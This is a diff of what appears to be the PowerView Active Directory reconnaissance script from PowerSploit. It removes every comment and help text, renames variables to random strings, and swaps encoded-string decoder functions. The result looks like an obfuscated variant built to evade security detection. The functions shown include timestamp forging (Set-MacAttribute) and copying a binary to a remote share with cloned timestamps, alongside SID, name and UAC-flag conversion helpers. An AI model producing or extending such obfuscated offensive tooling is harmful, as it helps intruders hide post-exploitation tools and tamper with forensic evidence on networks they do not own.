-    $MzxH.Emit([Reflection.Emit.OpCodes]::Ldtoken, $Yutpe)
-    $MzxH.Emit([Reflection.Emit.OpCodes]::Call,
+    $STUr1p = $bpu6pH.GetILGenerator()
+    $STUr1p.Emit([Reflection.Emit.OpCodes]::Nop)
+    $STUr1p.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
+    $STUr1p.Emit([Reflection.Emit.OpCodes]::Ldtoken, $rbgzr)
+    $STUr1p.Emit([Reflection.Emit.OpCodes]::Call,
         [Type].GetMethod('GetTypeFromHandle'))
-    $MzxH.Emit([Reflection.Emit.OpCodes]::Call,
+    $STUr1p.Emit([Reflection.Emit.OpCodes]::Call,
         [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
-    $MzxH.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $Yutpe)
-    $MzxH.Emit([Reflection.Emit.OpCodes]::Ret)
-
-    $Yutpe.CreateType()
+    $STUr1p.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $rbgzr)
+    $STUr1p.Emit([Reflection.Emit.OpCodes]::Ret)
+    $rbgzr.CreateType()
 }
-
-
-########################################################
-#
-# Misc. helpers
-#
-########################################################
-
 function Export-PowerViewCSV {
-<#
-    .SYNOPSIS
-
-        This function exports to a .csv in a thread-safe manner.
-        
-        Based partially on Dmitry Sotnikov's Export-CSV code
-            at http://poshcode.org/1590
-
-    .LINK
-
-        http://poshcode.org/1590
-        http://dmitrysotnikov.wordpress.com/2010/01/19/Export-Csv-append/
-#>
     Param(
         [Parameter(Mandatory=$True, ValueFromPipeline=$True,
         ValueFromPipelineByPropertyName=$True)]
         [System.Management.Automation.PSObject]
         $InputObject,
-
         [Parameter(Mandatory=$True, Position=0)]
         [Alias('PSPath')]
         [String]
         $OutFile
     )
-
     process {
-        
-        $nrrjBG = $InputObject | ConvertTo-Csv -NoTypeInformation
-
-        # mutex so threaded code doesn't stomp on the output file
-        $m3sXZpo2 = New-Object System.Threading.Mutex $False,'CSVMutex';
-        $Null = $m3sXZpo2.WaitOne()
-
+        $iqL3O = $InputObject | ConvertTo-Csv -NoTypeInformation
+        $Sn6IyOA = New-Object System.Threading.Mutex $False,'CSVMutex';
+        $Null = $Sn6IyOA.WaitOne()
         if (Test-Path -Path $OutFile) {
-            # hack to skip the first line of output if the file already exists
-            $nrrjBG | Foreach-Object {$Start=$True}{if ($Start) {$Start=$False} else {$_}} | Out-File -Encoding 'ASCII' -Append -FilePath $OutFile
+            $iqL3O | Foreach-Object {$Start=$True}{if ($Start) {$Start=$False} else {$_}} | Out-File -Encoding 'ASCII' -Append -FilePath $OutFile
         }
         else {
-            $nrrjBG | Out-File -Encoding 'ASCII' -Append -FilePath $OutFile
+            $iqL3O | Out-File -Encoding 'ASCII' -Append -FilePath $OutFile
         }
-
-        $m3sXZpo2.ReleaseMutex()
+        $Sn6IyOA.ReleaseMutex()
     }
 }
-
-
-# stolen directly from http://obscuresecurity.blogspot.com/2014/05/touch.html
 function Set-MacAttribute {
-<#
-    .SYNOPSIS
-
-        Sets the modified, accessed and created (Mac) attributes for a file based on another file or input.
-
-        PowerSploit Function: Set-MacAttribute
-        Author: Chris Campbell (@obscuresec)
-        License: BSD 3-Clause
-        Required Dependencies: None
-        Optional Dependencies: None
-        Version: 1.0.0
-
-    .DESCRIPTION
-
-        Set-MacAttribute sets one or more Mac attributes and returns the new attribute values of the file.
-
-    .EXAMPLE
-
-        PS C:\> Set-MacAttribute -FilePath c:\test\newfile -OldFilePath c:\test\oldfile
-
-    .EXAMPLE
-
-        PS C:\> Set-MacAttribute -FilePath c:\demo\test.xt -All "01/03/2006 12:12 pm"
-
-    .EXAMPLE
-
-        PS C:\> Set-MacAttribute -FilePath c:\demo\test.txt -Modified "01/03/2006 12:12 pm" -Accessed "01/03/2006 12:11 pm" -Created "01/03/2006 12:10 pm"
-
-    .LINK
-
-        http://www.obscuresec.com/2014/05/touch.html
-#>
     [CmdletBinding(DefaultParameterSetName = 'Touch')]
     Param (
-
         [Parameter(Position = 1,Mandatory = $True)]
         [ValidateScript({Test-Path -Path $_ })]
         [String]
         $FilePath,
-
         [Parameter(ParameterSetName = 'Touch')]
         [ValidateScript({Test-Path -Path $_ })]
         [String]
         $OldFilePath,
-
         [Parameter(ParameterSetName = 'Individual')]
         [DateTime]
         $Modified,
-
         [Parameter(ParameterSetName = 'Individual')]
         [DateTime]
         $Accessed,
-
         [Parameter(ParameterSetName = 'Individual')]
         [DateTime]
         $Created,
-
         [Parameter(ParameterSetName = 'All')]
         [DateTime]
         $AllMacAttributes
     )
-
-    #Helper function that returns an object with the MAC attributes of a file.
     function Get-MacAttribute {
-
         param($OldFileName)
-
         if (!(Test-Path -Path $OldFileName)) {Throw 'File Not Found'}
-        $DMYA = (Get-Item $OldFileName)
-
-        $DePCk = @{'Modified' = ($DMYA.LastWriteTime);
-                              'Accessed' = ($DMYA.LastAccessTime);
-                              'Created' = ($DMYA.CreationTime)};
-        $WBE58o8j = New-Object -TypeName PSObject -Property $DePCk
-        Return $WBE58o8j
+        $tdi7 = (Get-Item $OldFileName)
+        $pjsNBs = @{'Modified' = ($tdi7.LastWriteTime);
+                              'Accessed' = ($tdi7.LastAccessTime);
+                              'Created' = ($tdi7.CreationTime)};
+        $togoKF = New-Object -TypeName PSObject -Property $pjsNBs
+        Return $togoKF
     }
-
-    $DMYA = (Get-Item -Path $FilePath)
-
+    $tdi7 = (Get-Item -Path $FilePath)
     if ($PSBoundParameters['AllMacAttributes']) {
         $Modified = $AllMacAttributes
         $Accessed = $AllMacAttributes
         $Created = $AllMacAttributes
     }
-
     if ($PSBoundParameters['OldFilePath']) {
-        $nGgr = (Get-MacAttribute $OldFilePath)
-        $Modified = $nGgr.Modified
-        $Accessed = $nGgr.Accessed
-        $Created = $nGgr.Created
+        $HjqU = (Get-MacAttribute $OldFilePath)
+        $Modified = $HjqU.Modified
+        $Accessed = $HjqU.Accessed
+        $Created = $HjqU.Created
     }
-
-    if ($Modified) {$DMYA.LastWriteTime = $Modified}
-    if ($Accessed) {$DMYA.LastAccessTime = $Accessed}
-    if ($Created) {$DMYA.CreationTime = $Created}
-
+    if ($Modified) {$tdi7.LastWriteTime = $Modified}
+    if ($Accessed) {$tdi7.LastAccessTime = $Accessed}
+    if ($Created) {$tdi7.CreationTime = $Created}
     Return (Get-MacAttribute $FilePath)
 }
-
-
 function Copy-ClonedFile {
-<#
-    .SYNOPSIS
-
-        Copy a source file to a destination location, matching any MAC
-        properties as appropriate.
-
-    .PARAMETER SourceFile
-
-        Source file to copy.
-
-    .PARAMETER DestFile
-
-        Destination file path to copy file to.
-
-    .EXAMPLE
-
-        PS C:\> Copy-ClonedFile -SourceFile program.exe -DestFile \\WINDOWS7\tools\program.exe
-        
-        Copy the local program.exe binary to a remote location, matching the MAC properties of the remote exe.
-
-    .LINK
-
-        http://obscuresecurity.blogspot.com/2014/05/touch.html
-#>
-
     param(
         [Parameter(Mandatory = $True)]
         [String]
         [ValidateNotNullOrEmpty()]
         $SourceFile,
-
         [Parameter(Mandatory = $True)]
         [String]
         [ValidateNotNullOrEmpty()]
         $DestFile
     )
-
-    # clone the MAC properties
     Set-MacAttribute -FilePath $SourceFile -OldFilePath $DestFile
-
-    # copy the file off
     Copy-Item -Path $SourceFile -Destination $DestFile
 }
-
-
 function Get-IPAddress {
-<#
-    .SYNOPSIS
-
-        This function resolves a given hostename to its associated IPv4
-        address. If no hostname is provided, it defaults to returning
-        the IP address of the local host the script be being run on.
-
-    .EXAMPLE
-
-        PS C:\> Get-IPAddress -ComputerName SERVER
-        
-        Return the IPv4 address of 'SERVER'
-#>
-
     [CmdletBinding()]
     param(
         [Parameter(Position=0,ValueFromPipeline=$True)]
@@ -985,14 +470,11 @@ function Get-IPAddress {
     )
     process {
         try {
-            # get the IP resolution of this specified hostname
-            $XdK8679O = @(([Net.Dns]::GetHostEntry($ComputerName)).AddressList)
-
-            if ($XdK8679O.Count -ne 0) {
-                ForEach ($e9hz in $XdK8679O) {
-                    # make sure the returned result is IPv4
-                    if ($e9hz.AddressFamily -eq 'InterNetwork') {
-                        $e9hz.IPAddressToString
+            $PCyLA1 = @(([Net.Dns]::GetHostEntry($ComputerName)).AddressList)
+            if ($PCyLA1.Count -ne 0) {
+                ForEach ($NW6jRjlY in $PCyLA1) {
+                    if ($NW6jRjlY.AddressFamily -eq 'InterNetwork') {
+                        $NW6jRjlY.IPAddressToString
                     }
                 }
             }
@@ -1003,87 +485,43 @@ function Get-IPAddress {
     }
     end {}
 }
-
-
 function Convert-NameToSid {
-<#
-    .SYNOPSIS
-
-        Converts a given user/group name to a security identifier (SID).
-
-    .PARAMETER ObjectName
-
-        The user/group name to convert, can be 'user' or 'DOMAIN\user' format.
-
-    .PARAMETER Domain
-
-        Specific domain for the given user account, defaults to the current domain.
-
-    .EXAMPLE
-
-        PS C:\> Convert-NameToSid 'DEV\dfm'
-#>
     [CmdletBinding()]
     param(
         [Parameter(Mandatory=$True,ValueFromPipeline=$True)]
         [String]
         [Alias('Name')]
         $ObjectName,
-
         [String]
         $Domain = (Get-NetDomain).Name
     )
-
     process {
-        
         $ObjectName = $ObjectName -replace "/","\"
-        
         if($ObjectName.contains("\")) {
-            # if we get a DOMAIN\user format, auto convert it
             $Domain = $ObjectName.split("\")[0]
             $ObjectName = $ObjectName.split("\")[1]
         }
-
         try {
-            $RIIU = (New-Object System.Security.Principal.NTAccount($Domain,$ObjectName))
-            $RIIU.Translate([System.Security.Principal.SecurityIdentifier]).Value
+            $yEG0 = (New-Object System.Security.Principal.NTAccount($Domain,$ObjectName))
+            $yEG0.Translate([System.Security.Principal.SecurityIdentifier]).Value
         }
         catch {
-            Write-Verbose ((HandleResult95 @(235,150,74,201,161,249,147,200,155,60,185,142,247,134,200,173,38,200,169,216,137,213,135,11,161,172,193,140) @(184,193,127,251,248,174,235)) + $Domain + "\" + $ObjectName)
+            Write-Verbose ((ParseEntry20 @(162,128,97,149,168,128,44,215,171,148,22,209,168,186,36,203,168,228,5,209,147,186,18,211,171,131,59,192) @(241,215,84,167)) + $Domain + "\" + $ObjectName)
             $Null
         }
     }
 }
-
-
 function Convert-SidToName {
-<#
-    .SYNOPSIS
-    
-        Converts a security identifier (SID) to a group/user name.
-
-    .PARAMETER SID
-    
-        The SID to convert.
-
-    .EXAMPLE
-
-        PS C:\> Convert-SidToName S-1-5-21-2620891829-2411261497-1773853088-1105
-#>
     [CmdletBinding()]
     param(
         [Parameter(Mandatory=$True,ValueFromPipeline=$True)]
         [String]
         $SID
     )
-
     process {
         try {
-            $F3OOnS = $SID.trim('*')
-
-            # try to resolve any built-in SIDs first
-            #   from https://support.microsoft.com/en-us/kb/243330
-            Switch ($F3OOnS)
+            $ImBF5n = $SID.trim('*')
+            Switch ($ImBF5n)
             {
                 'S-1-0'         { 'Null Authority' }
                 'S-1-0-0'       { 'Nobody' }
@@ -1147,339 +585,201 @@ function Convert-SidToName {
                 'S-1-5-32-579'  { 'BUILTIN\Access Control Assistance Operators' }
                 'S-1-5-32-580'  { 'BUILTIN\Access Control Assistance Operators' }
                 Default { 
-                    $RIIU = (New-Object System.Security.Principal.SecurityIdentifier($F3OOnS))
-                    $RIIU.Translate( [System.Security.Principal.NTAccount]).Value
+                    $yEG0 = (New-Object System.Security.Principal.SecurityIdentifier($ImBF5n))
+                    $yEG0.Translate( [System.Security.Principal.NTAccount]).Value
                 }
             }
         }
         catch {
-            # Write-Warning "Invalid SID: $SID"
             $SID
         }
     }
 }
-
-
 function Convert-NT4toCanonical {
-<#
-    .SYNOPSIS
-
-        Converts a user/group NT4 name (i.e. dev/john) to canonical format.
-
-        Based on Bill Stewart's code from this article: 
-            http://windowsitpro.com/active-directory/translating-active-directory-object-names-between-formats
-
-    .PARAMETER ObjectName
-
-        The user/group name to convert, needs to be in 'DOMAIN\user' format.
-
-    .EXAMPLE
-
-        PS C:\> Convert-NT4toCanonical -ObjectName "dev\dfm"
-        
-        Returns "dev.testlab.local/Users/Dave"
-
-    .LINK
-
-        http://windowsitpro.com/active-directory/translating-active-directory-object-names-between-formats
-#>
     [CmdletBinding()]
     param(
         [Parameter(Mandatory=$True,ValueFromPipeline=$True)]
         [String]
         $ObjectName
     )
-
     process {
-
         $ObjectName = $ObjectName -replace "/","\"
-        
         if($ObjectName.contains("\")) {
-            # if we get a DOMAIN\user format, try to extract the domain
             $Domain = $ObjectName.split("\")[0]
         }
-
-        # Accessor functions to simplify calls to NameTranslate
-        function Invoke-Method([__ComObject] $Object, [String] $CByfstuP, $u3zVG96v) {
-            $aZKCn1r = $Object.GetType().InvokeMember($CByfstuP, (HandleResult95 @(186,47,207,217,220,134,66,153,189,47,172,219,223,243,15,158) @(233,120,250,235,190,180,54,245)), $Null, $Object, $u3zVG96v)
-            if ( $aZKCn1r ) { $aZKCn1r }
+        function Invoke-Method([__ComObject] $Object, [String] $dBTTFvP, $XmBWhC) {
+            $t0ADrI = $Object.GetType().InvokeMember($dBTTFvP, (ParseEntry20 @(248,255,2,40,76,103,242,199,252,96,76,30,52,193,146,195) @(171,168,55,26,46,85,134)), $Null, $Object, $XmBWhC)
+            if ( $t0ADrI ) { $t0ADrI }
         }
-        function Set-Property([__ComObject] $Object, [String] $iNusS, $u3zVG96v) {
-            [Void] $Object.GetType().InvokeMember($iNusS, (HandleResult95 @(230,56,64,240,105,182,220,224,208,77,64,185,88,182,253,171) @(179,10,22,192,60,254,150,150)), $Null, $Object, $u3zVG96v)
+        function Set-Property([__ComObject] $Object, [String] $JG1jAVen, $XmBWhC) {
+            [Void] $Object.GetType().InvokeMember($JG1jAVen, (ParseEntry20 @(57,129,40,120,240,36,249,8,43,226,58,202,26,0,206,81) @(108,179,126,72,165)), $Null, $Object, $XmBWhC)
         }
-
-        $B89w = New-Object -ComObject NameTranslate
-
+        $XFuGFI = New-Object -ComObject NameTranslate
         try {
-            Invoke-Method $B89w (HandleResult95 @(128,25,155,183,111,146,115,147) @(211,78,174,199,11)) (1, $Domain)
+            Invoke-Method $XFuGFI (ParseEntry20 @(143,24,241,122,13,91,255,165) @(220,79,196,10,105,26,194,152)) (1, $Domain)
         }
         catch [System.Management.Automation.MethodInvocationException] { 
-            Write-Debug ((HandleResult95 @(22,62,73,169,52,143,70,35,2,49,188,102,221,76,6,86,96,189,16,201,108,118,30,107,180,17,233,104,37,49,54,160,50,255,77,52,4,106,146,18,222,61,113,84,89,136,28,140,67,17,83,86,158,30,238,121,21,84,69,165,52,142,58,52,63,49,150,37,243,102,5,91) @(68,102,3,208,86,188,15)) + $_)
+            Write-Debug ((ParseEntry20 @(23,19,246,67,186,235,12,44,216,8,180,232,36,8,254,10,187,181,3,62,223,8,160,176,33,12,233,93,185,143,112,59,216,121,154,168,39,34,254,126,186,234,112,121,230,98,146,232,9,30,137,111,150,144,23,61,237,8,158,173,39,121,137,74,129,234,3,56,243,83,153,229) @(69,75,188,58,216,216)) + $_)
         }
-
-        Set-Property $B89w (HandleResult95 @(99,191,182,133,67,77,19,179,104,218,132,129,67,17,15,136,80,204,227,208) @(50,141,222,237,32,127,69,224)) (0x60)
-
+        Set-Property $XFuGFI (ParseEntry20 @(216,117,130,71,234,117,188,124,211,16,176,67,234,41,160,71,235,6,215,18) @(137,71,234,47)) (0x60)
         try {
-            Invoke-Method $B89w (HandleResult95 @(167,132,220,130) @(242,182,138,178,98,88,222)) (3, $ObjectName)
-            (Invoke-Method $B89w (HandleResult95 @(28,5,185,43) @(78,55,239,27,29)) (2))
+            Invoke-Method $XFuGFI (ParseEntry20 @(51,217,94,84) @(102,235,8,100,151,148)) (3, $ObjectName)
+            (Invoke-Method $XFuGFI (ParseEntry20 @(129,87,94,26) @(211,101,8,42,129,7)) (2))
         }
         catch [System.Management.Automation.MethodInvocationException] {
-            Write-Debug ((HandleResult95 @(83,77,96,53,99,38,99,43,101,39,70,124,96,86,104,124,98,120,108,57,98,39,82,36,101,82,127,43,84,39,124,124,77,37,78,32,101,86,104,60,99,124,104,8,99,39,31,126,91,77,96,124,77,64,31,25,79,93,120,58,80,39,108,57,99,39,31,60,88,39,108,63,78,124,107,113) @(1,21,42,76)) + $_)
+            Write-Debug ((ParseEntry20 @(187,207,160,153,130,7,160,240,142,210,140,4,136,212,168,208,131,89,175,226,137,210,152,92,141,208,191,135,181,6,191,167,166,208,132,88,141,212,168,144,130,93,171,211,136,210,213,6,179,207,160,208,172,97,220,194,164,168,178,66,184,165,172,149,130,6,220,231,179,210,166,71,166,254,171,221) @(233,151,234,224,224,52)) + $_)
         }
     }
 }
-
-
 function Convert-CanonicaltoNT4 {
-<#
-    .SYNOPSIS
-
-        Converts a user@fqdn to NT4 format.
-
-    .PARAMETER ObjectName
-
-        The user/group name to convert, needs to be in 'DOMAIN\user' format.
-
-    .LINK
-
-        http://windowsitpro.com/active-directory/translating-active-directory-object-names-between-formats
-#>
-
     [CmdletBinding()]
     param(
         [String] $ObjectName
     )
-
     $Domain = ($ObjectName -split "@")[1]
-
     $ObjectName = $ObjectName -replace "/","\"
-
-    # Accessor functions to simplify calls to NameTranslate
-    function Invoke-Method([__ComObject] $object, [String] $CByfstuP, $u3zVG96v) {
-        $aZKCn1r = $object.GetType().InvokeMember($CByfstuP, (HandleResult95 @(39,3,225,201,165,173,178,114,32,3,130,203,166,216,255,117) @(116,84,212,251,199,159,198,30)), $NULL, $object, $u3zVG96v)
-        if ( $aZKCn1r ) { $aZKCn1r }
+    function Invoke-Method([__ComObject] $object, [String] $dBTTFvP, $XmBWhC) {
+        $t0ADrI = $object.GetType().InvokeMember($dBTTFvP, (ParseEntry20 @(255,198,136,182,92,60,138,192,197,234,210,14,111,185,149,250) @(172,145,189,132,62,14,254)), $NULL, $object, $XmBWhC)
+        if ( $t0ADrI ) { $t0ADrI }
     }
-    function Set-Property([__ComObject] $object, [String] $iNusS, $u3zVG96v) {
-        [Void] $object.GetType().InvokeMember($iNusS, (HandleResult95 @(206,147,143,224,226,127,252,110,248,230,143,169,211,127,221,37) @(155,161,217,208,183,55,182,24)), $NULL, $object, $u3zVG96v)
+    function Set-Property([__ComObject] $object, [String] $JG1jAVen, $XmBWhC) {
+        [Void] $object.GetType().InvokeMember($JG1jAVen, (ParseEntry20 @(53,126,97,216,53,4,125,158,3,11,97,145,4,4,92,213) @(96,76,55,232)), $NULL, $object, $XmBWhC)
     }
-
-    $B89w = New-Object -comobject NameTranslate
-
+    $XFuGFI = New-Object -comobject NameTranslate
     try {
-        Invoke-Method $B89w (HandleResult95 @(163,203,42,40,148,221,34,101) @(240,156,31,88)) (1, $Domain)
+        Invoke-Method $XFuGFI (ParseEntry20 @(212,94,163,33,131,209,158,155) @(135,9,150,81,231,144,163,166)) (1, $Domain)
     }
     catch [System.Management.Automation.MethodInvocationException] { }
-
-    Set-Property $B89w (HandleResult95 @(70,112,66,214,181,37,20,121,228,129,77,46,73,208,156,127,32,107,131,235) @(23,66,42,190,214)) (0x60)
-
+    Set-Property $XFuGFI (ParseEntry20 @(16,28,119,140,173,141,230,18,116,72,190,162,220,222,11,70,125,165,243,130) @(65,46,31,228,206,191,176)) (0x60)
     try {
-        Invoke-Method $B89w (HandleResult95 @(218,237,37,125) @(143,223,115,77,66,187)) (5, $ObjectName)
-        (Invoke-Method $B89w (HandleResult95 @(178,197,175,61) @(224,247,249,13,76,198,23)) (3))
+        Invoke-Method $XFuGFI (ParseEntry20 @(246,24,92,163) @(163,42,10,147,134)) (5, $ObjectName)
+        (Invoke-Method $XFuGFI (ParseEntry20 @(6,9,76,204) @(84,59,26,252)) (3))
     }
     catch [System.Management.Automation.MethodInvocationException] { $_ }
 }
-
-
 function ConvertFrom-UACValue {
-<#
-    .SYNOPSIS
-
-        Converts a UAC int value to human readable form.
-
-    .PARAMETER Value
-
-        The int UAC value to convert.
-
-    .PARAMETER ShowAll
-
-        Show all UAC values, with a + indicating the value is currently set.
-
-    .EXAMPLE
-
-        PS C:\> ConvertFrom-UACValue -Value 66176
-
-        Convert the UAC value 66176 to human readable format.
-
-    .EXAMPLE
-
-        PS C:\> Get-NetUser jason | select useraccountcontrol | ConvertFrom-UACValue
-
-        Convert the UAC value for 'jason' to human readable format.
-
-    .EXAMPLE
-
-        PS C:\> Get-NetUser jason | select useraccountcontrol | ConvertFrom-UACValue -ShowAll
-
-        Convert the UAC value for 'jason' to human readable format, showing all
-        possible UAC values.
-#>
-    
     [CmdletBinding()]
     param(
         [Parameter(ValueFromPipeline=$True)]
         $Value,
-
         [Switch]
         $ShowAll
     )
-
     begin {
-
-        # values from https://support.microsoft.com/en-us/kb/305144
-        $VUkw = New-Object System.Collections.Specialized.OrderedDictionary
-        $VUkw.Add((HandleResult95 @(219,2,7,48,221,100,11,54) @(142,50,73,99)), 1)
-        $VUkw.Add((HandleResult95 @(82,102,195,16,87,2,219,27,85,118,223,30,86,3,203,23,87,118,216,105) @(3,51,141,84)), 2)
-        $VUkw.Add((HandleResult95 @(12,174,2,142,9,10,185,113,149,55,102,184,105,150,29,9,184,109,138,29,13,170,6,253) @(95,235,59,192,91)), 8)
-        $VUkw.Add((HandleResult95 @(114,255,229,214,225,128,248,7,112,251,225,175) @(38,186,220,146,178,176,193,81)), 16)
-        $VUkw.Add((HandleResult95 @(245,219,143,33,35,166,8,229,198,249,64,38,193,42,234,216,156,32,39,170) @(160,158,201,117,118,151,108)), 32)
-        $VUkw.Add((HandleResult95 @(209,161,117,27,53,232,224,161,107,127,46,155,208,136,97,41,49,233,236,166,103,36,4,159) @(132,228,51,79,96,217)), 64)
-        $VUkw.Add((HandleResult95 @(246,1,244,57,241,56,173,44,242,17,151,56,252,101,147,59,243,18,147,27,241,18,165,56,252,100,135,48,240,17,248,37,246,1,144,64) @(164,84,193,125)), 128)
-        $VUkw.Add((HandleResult95 @(26,135,58,32,7,117,117,135,58,56,16,126,31,151,34,44,4,118,26,164,61,59,28,119,24,243,58,33,4,114,113,255) @(76,194,108,110,82,51)), 256)
-        $VUkw.Add((HandleResult95 @(238,201,49,126,79,106,17,127,226,146,78,105,74,15,110,100,238,206,89,16) @(186,162,8,45,27,63,87,50)), 512)
-        $VUkw.Add((HandleResult95 @(65,87,253,88,77,68,72,141,89,47,35,64,155,88,42,116,84,142,71,73,71,51,154,107,78,71,76,140,89,46,68,77,158,76,34,47) @(18,2,200,13,31)), 2048)
-        $VUkw.Add((HandleResult95 @(106,64,126,19,95,167,114,37,22,22,94,220,104,64,114,38,90,208,118,38,18,113,94,240,109,37,9,4,88,167,106,63,17,1,49,171) @(60,112,71,64,12,150)), 4096)
-        $VUkw.Add((HandleResult95 @(150,90,118,85,152,18,107,144,50,17,84,157,47,107,141,63,120,54,136,61,108,243,83,118,82,162,40,0) @(195,106,32,6,206,121,61)), 8192)
-        $VUkw.Add((HandleResult95 @(185,129,188,82,35,25,243,231,188,130,199,87,32,52,156,199,190,129,195,73,32,110,174,241,190,175,212,32) @(235,196,133,29,117,95,202,161)), 65536)
-        $VUkw.Add((HandleResult95 @(121,117,139,34,153,8,85,112,236,70,248,119,117,16,248,50,144,8,20,118,234,26,144,5) @(45,32,190,118,193,56)), 131072)
-        $VUkw.Add((HandleResult95 @(13,77,245,30,164,181,99,28,44,146,22,180,129,0,18,59,145,10,167,147,100,51,43,129) @(88,125,196,92,241,217,49)), 262144)
-        $VUkw.Add((HandleResult95 @(22,186,155,16,24,113,174,151,20,11,121,187,133,119,7,38,174,148,16,0,18,169,181,4,27,5,144,129,18,42,125,193) @(64,252,209,70,77)), 524288)
-        $VUkw.Add((HandleResult95 @(148,98,110,125,30,240,91,17,124,3,150,65,6,126,20,134,91,22,21,123) @(192,9,87,40,70)), 1048576)
-        $VUkw.Add((HandleResult95 @(37,118,210,85,19,231,34,53,117,173,42,7,133,38,31,70,200,35,126,154,39,34,29,161) @(115,32,156,19,75,215,112)), 2097152)
-        $VUkw.Add((HandleResult95 @(25,221,72,118,29,222,72,106,25,206,55,95,30,222,59,127,26,206,39,108,24,217,76,4) @(75,152,113,57)), 4194304)
-        $VUkw.Add((HandleResult95 @(53,36,91,15,195,14,25,196,53,10,79,61,196,105,21,197,51,55,87,29,196,126,64,169) @(96,97,29,91,150,63,125,148)), 8388608)
-        $VUkw.Add((HandleResult95 @(8,79,60,70,174,111,91,48,66,189,103,92,34,33,194,28,95,32,66,178,6,57,44,64,174,50,48,51,66,174,38,79,36,32,189,11,90,35,41,180) @(94,9,118,16,251)), 16777216)
-        $VUkw.Add((HandleResult95 @(37,20,236,143,38,20,198,158,36,23,147,136,34,4,228,143,34,7,248,136,40,97,236,152,33,97,147,138,36,61,251,225) @(112,81,170,220)), 67108864)
-
+        $IzZb = New-Object System.Collections.Specialized.OrderedDictionary
+        $IzZb.Add((ParseEntry20 @(152,84,216,146,225,229,152,152) @(205,100,150,193,178,179,218)), 1)
+        $IzZb.Add((ParseEntry20 @(107,128,39,108,155,30,232,117,131,44,122,133,122,142,124,150,61,109,154,18) @(58,213,105,40,207,47,190)), 2)
+        $IzZb.Add((ParseEntry20 @(84,243,178,70,47,50,24,77,227,231,49,46,53,28,65,224,216,94,55,33,24,70,139,182) @(7,182,139,8,125,103,74)), 8)
+        $IzZb.Add((ParseEntry20 @(51,13,63,26,183,210,175,255,49,9,59,99) @(103,72,6,94,228,226,150,169)), 16)
+        $IzZb.Add((ParseEntry20 @(254,171,123,254,204,179,65,238,182,13,159,201,212,99,225,168,104,255,200,191) @(171,238,61,170,153,130,37)), 32)
+        $IzZb.Add((ParseEntry20 @(56,218,181,223,86,1,9,218,171,187,77,114,57,243,161,237,82,0,5,221,167,224,103,118) @(109,159,243,139,3,48)), 64)
+        $IzZb.Add((ParseEntry20 @(195,31,82,180,171,90,34,192,28,34,166,187,110,127,195,12,48,182,172,80,27,215,46,34,168,206,112,3,197,15,94,168,172,99,31,172) @(145,74,103,240,254,54,78)), 128)
+        $IzZb.Add((ParseEntry20 @(91,38,152,240,253,135,52,38,152,232,234,140,94,54,128,252,254,132,91,5,159,235,230,133,89,82,152,241,254,128,48,94) @(13,99,206,190,168,193)), 256)
+        $IzZb.Add((ParseEntry20 @(0,141,17,217,204,1,160,101,210,168,18,162,121,186,161,2,178,68,219,165) @(84,230,40,138,152)), 512)
+        $IzZb.Add((ParseEntry20 @(30,68,134,160,139,17,7,84,231,197,232,5,30,68,134,147,143,1,7,71,230,196,139,33,28,68,253,177,141,118,27,94,229,180,228,122) @(77,17,179,245,217,71)), 2048)
+        $IzZb.Add((ParseEntry20 @(168,201,80,27,173,200,39,29,175,175,59,2,170,201,92,46,168,191,35,30,171,200,59,46,175,172,39,12,170,200,63,7,168,184,84,117) @(254,249,105,72)), 4096)
+        $IzZb.Add((ParseEntry20 @(7,65,15,176,248,252,80,240,10,64,11,176,248,193,72,246,10,65,31,167,255,167,63,245,6,29,8,222) @(82,113,89,227,174,151,6,163)), 8192)
+        $IzZb.Add((ParseEntry20 @(16,60,202,167,171,4,64,181,191,187,0,51,166,131,171,36,44,182,174,169,23,72,151,184,168,41,40,206) @(66,121,243,232,253)), 65536)
+        $IzZb.Add((ParseEntry20 @(133,132,220,123,156,173,169,129,187,31,253,210,137,225,175,107,149,173,232,135,189,67,149,160) @(209,209,233,47,196,157)), 131072)
+        $IzZb.Add((ParseEntry20 @(203,145,210,5,243,227,204,229,178,17,236,202,198,144,169,1,243,217,200,235,182,44,240,202) @(158,161,227,71,166,143)), 262144)
+        $IzZb.Add((ParseEntry20 @(163,54,139,192,106,196,34,135,196,121,204,55,149,167,117,147,34,132,192,114,167,37,165,212,105,176,28,145,194,88,200,77) @(245,112,193,150,63)), 524288)
+        $IzZb.Add((ParseEntry20 @(239,6,207,80,57,0,62,130,239,40,160,77,48,102,62,130,233,44,203,56) @(187,109,246,5,97,48,108,196)), 1048576)
+        $IzZb.Add((ParseEntry20 @(248,109,209,162,177,42,252,125,202,213,208,86,252,109,243,130,189,42,155,118,200,181,212,39) @(174,59,159,228,233,26)), 2097152)
+        $IzZb.Add((ParseEntry20 @(74,67,135,119,103,29,33,85,236,110,119,61,77,64,244,126,96,13,78,83,237,121,12,102) @(24,6,190,56,49,91)), 4194304)
+        $IzZb.Add((ParseEntry20 @(128,124,56,129,31,228,93,46,128,33,135,95,44,131,34,132,106,40,159,12,135,120,67,232) @(213,57,126,213,74)), 8388608)
+        $IzZb.Add((ParseEntry20 @(68,0,37,153,30,35,20,41,157,13,43,19,59,254,114,80,16,57,157,2,74,118,53,159,30,126,127,42,157,30,106,0,61,255,13,71,21,58,246,4) @(18,70,111,207,75)), 16777216)
+        $IzZb.Add((ParseEntry20 @(130,223,233,62,105,149,97,171,131,220,150,57,109,133,67,186,133,204,253,57,103,224,75,173,134,170,150,59,107,188,92,212) @(215,154,175,109,63,208,13,233)), 67108864)
     }
-
     process {
-
-        $hRmvA = New-Object System.Collections.Specialized.OrderedDictionary
-
+        $Ojx2zmYY = New-Object System.Collections.Specialized.OrderedDictionary
         if($Value -is [Int]) {
-            $vJVX = $Value
+            $GqGDkC = $Value
         }
-
         if ($Value -is [PSCustomObject]) {
             if($Value.useraccountcontrol) {
-                $vJVX = $Value.useraccountcontrol
+                $GqGDkC = $Value.useraccountcontrol
             }
         }
-
-        if($vJVX) {
-
+        if($GqGDkC) {
             if($ShowAll) {
-                foreach ($ZVFUQeg in $VUkw.GetEnumerator()) {
-                    if( ($vJVX -band $ZVFUQeg.Value) -eq $ZVFUQeg.Value) {
-                        $hRmvA.Add($ZVFUQeg.Name, ($($ZVFUQeg.Value) + "+"))
+                foreach ($zLQBAF in $IzZb.GetEnumerator()) {
+                    if( ($GqGDkC -band $zLQBAF.Value) -eq $zLQBAF.Value) {
